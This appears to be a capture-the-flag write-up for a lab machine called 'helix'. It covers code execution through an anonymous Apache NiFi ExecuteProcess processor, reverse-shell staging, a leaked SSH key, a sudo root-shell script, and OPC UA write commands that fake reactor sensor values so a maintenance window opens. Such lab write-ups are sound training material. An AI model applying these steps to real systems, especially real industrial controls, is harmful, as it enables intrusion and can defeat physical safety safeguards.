# helix

```
Nmap scan report for 10.129.245.123
Host is up, received echo-reply ttl 63 (0.070s latency).
Scanned at 2026-06-24 22:48:02 EDT for 62s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:b3:f7:6c:0b:92:ab:00:ac:e7:12:e1:d1:26:9c:1e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPTJ+LkpmuH2sQS9dhqnvmpl1NhudGQHvIxfw5Qrhj2MEU4J7VXSPAt/OPas+zeYGU8XOWgNtfnJjHEYe3XsLII=
|   256 c8:30:e6:cb:c6:cd:fc:0c:39:e5:34:04:20:07:b9:b3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGYnLTVO7QjbF2nWYA4R9O3DaSGllmNuBdWKKZyZxMZS
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://helix.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

site has two public functions: "request a call" and "start a project". requesting a call lets you send you email, name summary. start a project is just a summary

the submit functions dont seem to actually do anything??

fuzz for any other functionality - find subdomain "flow"

`flow.helix.htb` is running [apache nifi](https://github.com/apache/nifi)

nifi is a way to automate data pipelines. you can add processors that generate data for example and pass them to other process to do shit. lots of interesting processors exist like `GetFile`, `ExecuteSQL`, etc. but of course our first target is `ExecuteProcess`. Nifi has granular controls that can deny or allow code exec processors. we are `anonymous` but are still able to run the `ExecuteProcess` processor. pinging myself to confirm code exec:

![nifi](/images/20260625_03h16m30s_grim.png)
![ping](/images/20260625_03h16m01s_grim.png)

i couldnt really figure out how to spawn the revshell directly so i just dropped it as a script and used `ExecProcess` to curl it down and chmod +x it

## privesc

there are a couple "helix" services, some running as root. this could be the root path?:

![bins](/images/20260624_21h47m22s_grim.png)

once we get to operator, `helix-maint-console` in /usr/local/sbin is readable

what is :4840??

honestly it took me fucking forever to find because i just skipped over that dir in nifi, but there is a `.bak` to `operator`'s private ssh key in `support_bundles/` in the nifi install dir. lesson: don't assume shit. i only found this after trawling through linpeas output after getting frustrated i couldn't find anything else

---

in the process though i got a lay of the land, there is an internal web service on `:8081`, and `helix-safety` runs as root. so what's up with that web service??

here is the script I noticed earlier as well, operator can run this nopasswd with sudo:

```bash
#!/bin/bash
set -euo pipefail

FLAG="/opt/helix/state/maintenance_window"

read_until() { cat "$FLAG" 2>/dev/null || true; }

window_ok() {
  [ -f "$FLAG" ] || return 1
  local until_ts now
  until_ts="$(read_until)"
  now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
  [ "$now" -lt "$until_ts" ] || return 1
  return 0
}

if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
fi

until_ts="$(read_until)"
now="$(date +%s)"
remaining=$((until_ts-now))

echo "[+] Privileged maintenance access granted"
echo "[!] Window expires in ${remaining} seconds"
echo "[!] Session will be terminated automatically"

# Unique scope name
SCOPE="helix-maint-$$"

# Launch an interactive root shell attached to THIS TTY, in its own systemd scope
systemd-run --quiet --scope --unit="$SCOPE" --property=KillMode=control-group --property=SendSIGHUP=yes \
  /bin/bash -p -i

# If systemd-run returns, the shell exited.
exit 0
```

so if we land in the maintenance window, we can get root? whatever, let's check out the internal web service

it's some sort of a dashboard for a reactor. it says that maintenance window opens under dangerous test conditions. we get a "OPC UA" url of `opc.tcp://127.0.0.1:4840/helix/` (what is that?). presumably we can manipulate this into generating the file we need?

its "open platforms communications unified architecture" and is used for industrial IoT like sensors to communicate with cloud apps.

the page even tells us the values that will trigger the maintenance window (temp >= 295C or pressure >= 73bar)

in `operator`'s home there is a little graphic explaining the layout, essentially operators/opc ua clients have access to certain writable properties of the control/reactor systems, including `mode` and `calibration offset`

also there is a control+safety guide pdf but it's password protected. the password easily cracks with hashcat mode 10700

the guide tells us the precautions in place to prevent mishandling/misuse of the control vars. we need to enable maintenance mode and testoverride, and manipulate the calibrationoffset to enter the range of sensor values that enables the maintenance window. if we go too far a safety trip will be triggered. if we have the right values a maintenance window should open, during which we can use the `helix-main-console`

there is also a systemd timer cleaning everything up every 5 minutes

ua has a hierarchical structure of nodes; playing around with the `ua` utilities in `operator`'s local bin we can find the values which we need to change:

```bash
operator@helix:~$ uabrowse -n i=85 -i 2 -p 2:Plant,2:Control
Browsing node ns=2;i=11 at opc.tcp://localhost:4840

DisplayName                    NodeId                    BrowseName                Value

LocalizedText(Locale=None, Text='Mode') ns=2;i=12                 2:Mode                   , NORMAL
LocalizedText(Locale=None, Text='TestOverride') ns=2;i=13                 2:TestOverride           , False
LocalizedText(Locale=None, Text='ResetTrip') ns=2;i=14                 2:ResetTrip              , False

operator@helix:~$ uabrowse -n i=85 -i 2 -p 2:Plant,2:Reactor
Browsing node ns=2;i=2 at opc.tcp://localhost:4840

DisplayName                    NodeId                    BrowseName                Value

LocalizedText(Locale=None, Text='TemperatureRaw') ns=2;i=3                  2:TemperatureRaw         , 283.99995817224635
LocalizedText(Locale=None, Text='Temperature') ns=2;i=4                  2:Temperature            , 283.99995817224635
LocalizedText(Locale=None, Text='Pressure') ns=2;i=5                  2:Pressure               , 68.9999773315357
LocalizedText(Locale=None, Text='CalibrationOffset') ns=2;i=6                  2:CalibrationOffset      , 0.0

operator@helix:~$ uabrowse -n i=85 -i 2 -p 2:Plant,2:Safety
Browsing node ns=2;i=7 at opc.tcp://localhost:4840

DisplayName                    NodeId                    BrowseName                Value

LocalizedText(Locale=None, Text='RodsInserted') ns=2;i=8                  2:RodsInserted           , False
LocalizedText(Locale=None, Text='EmergencyCooling') ns=2;i=9                  2:EmergencyCooling       , False
LocalizedText(Locale=None, Text='TripActive') ns=2;i=10                 2:TripActive             , False
```

and the write commands:

```bash
uawrite -n i=85 -i 2 -p 2:Plant,2:Control,2:Mode MAINTENANCE
uawrite -n i=85 -i 2 -p 2:Plant,2:Control,2:TestOverride True
uawrite -n i=85 -i 2 -p 2:Plant,2:Reactor,2:CalibrationOffset 12.0
```

once the window opens, just `sudo helix-maint-console` and you have a root shell for 100 or so seconds!

![pwn](/images/20260625_02h57m25s_grim.png)
